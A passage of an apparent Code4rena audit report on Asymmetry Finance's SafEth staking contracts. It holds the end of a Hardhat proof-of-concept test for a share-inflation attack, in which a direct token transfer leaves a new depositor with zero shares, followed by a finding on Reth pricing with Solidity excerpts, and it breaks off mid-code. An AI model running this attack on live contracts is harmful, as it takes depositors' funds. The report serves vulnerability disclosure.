class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">request</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">method:</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat_impersonateAccount&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">WSTETH_WHALE</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whaleSigner</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WSTETH_WHALE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Contract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WSTETH_ADRESS</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">, </span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wderivative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivativesAddress</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20BalanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wderivative</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//remove all but 1 sfToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">unstakeResult</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userStrategySigner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userSfWithdraw</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20Whale</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">whaleSigner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20Amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer tokens directly to the derivative (done by attacker)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">erc20Whale</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wderivative</span><span class=\"mtk1\">, </span><span class=\"mtk12\">erc20Amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NEW USER ENTERS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount2</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;1.5&quot;</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAmount2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeResu2lt</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userStrategySigner2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stake</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mined2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeResult</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wait</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// User has 0 sfTokens!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userSfEthBalance2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;userSfEthBalance2: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">userSfEthBalance2</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Attacker has 1 sfToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AttakcerSfEthBalanc</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userAccounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;AttakcerSfEthBalanc: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AttakcerSfEthBalanc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Total supply is 1. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;totalSupply: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toString</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>vscode, hardhat</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Use internal accounting to get the balance.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/25\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/23\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/3\">0x52</a>.</p>\n<hr>\n<h2 id=\"h-02-a-temporary-issue-shows-in-the-staking-functionality-which-leads-to-the-users-receiving-less-minted-tokens\" style=\"position:relative;\"><a href=\"#h-02-a-temporary-issue-shows-in-the-staking-functionality-which-leads-to-the-users-receiving-less-minted-tokens\" aria-label=\"h 02 a temporary issue shows in the staking functionality which leads to the users receiving less minted tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004\">[H-02] A temporary issue shows in the staking functionality which leads to the users receiving less minted tokens</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004\">CodingNameKiki</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1086\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1071\">0xd1r4cde17a</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/909\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/888\">slippopz</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/846\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/696\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/627\">MadWookie</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/587\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/577\">Moliholy</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/567\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/547\">Franfran</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/414\">gjaldon</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/270\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/268\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/219\">igingu</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/209\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L156-L204\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L156-L204</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L211-L216\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L211-L216</a></p>\n<h3 id=\"derivative-reth-prices\" style=\"position:relative;\"><a href=\"#derivative-reth-prices\" aria-label=\"derivative reth prices permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Derivative Reth prices</h3>\n<p>A quick explanation of the issue causing it, the problem is based on the function “ethPerDerivative” in the Reth derivative.</p>\n<p>As you can see two statements can be triggered here, the first one “if (poolCanDeposit(_amount))” checks if the given amount + the pool balance isn’t greater than the maximumDepositPoolSize and that the amount is greater than the minimum deposit in the pool. Second statement is meant to return a poolPrice which is slightly more than the regular one, because it’s used in order to swap tokens in Uniswap and therefore the price per token is overpriced.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getEthValue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// poolCanDeposit() returns:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMaximumDepositPoolSize</span><span class=\"mtk1\">() &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinimumDeposit</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Below you can see the regular price returned in the first statement - 1063960369075232250:</p>\n<img width=\"417\" alt=\"Screenshot 2023-03-27 at 8 53 34\" src=\"https://user-images.githubusercontent.com/112419701/227852484-9bf0144d-820d-414c-8cb9-e1fb44f5c806.png\">\n<p>Below you can see the pool price from the second statement, supposed to be used only when a swap is made.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// poolPrice calculates and returns</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint160</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sqrtPriceX96</span><span class=\"mtk1\">, , , , , , ) = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slot0</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sqrtPriceX96</span><span class=\"mtk1\"> * (</span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sqrtPriceX96</span><span class=\"mtk1\">)) * (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)) &gt;&gt; (</span><span class=\"mtk7\">96</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// uint160 sqrtPriceX96 = 81935751724326368909606241317</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) &gt;&gt; (96 * 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// return 1069517062752670179 (pool price)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// The function &quot;ethPerDerivative&quot; for the else statement return (poolPrice() * 10 ** 18) / (10 ** 18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Which will be - 1069517062752670179</span></span></span></code></pre>\n<p>Difference between the regular price and the pool price:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">regular price - 1063960369075232250</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pool price -    1069517062752670179</span></span></code></pre>\n<h3 id=\"quick-overview\" style=\"position:relative;\"><a href=\"#quick-overview\" aria-label=\"quick overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quick Overview</h3>\n<p>What can result to users receiving less minted tokens?</p>\n<p>The first thing the staking function does is calculating the derivative underlyingValue. This issue occurs on the Reth derivative, as we can see the staking function calls “ethPerDerivative” to get the price, but takes as account the whole Reth balance of the derivative contract.</p>\n<p>For example let’s say the derivative Reth holds 200e18. The pool has free space for 100e18 more till it reaches its maximum pool size. As the function calls ethPerDerivative with the Reth balance of 200e18 instead of the amount being staked.\nThe contract will think there is no more space in the pool (even tho there is 100e18 more) and will return the pool price which is overpriced and meant for the swap in Uniswap.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span><span 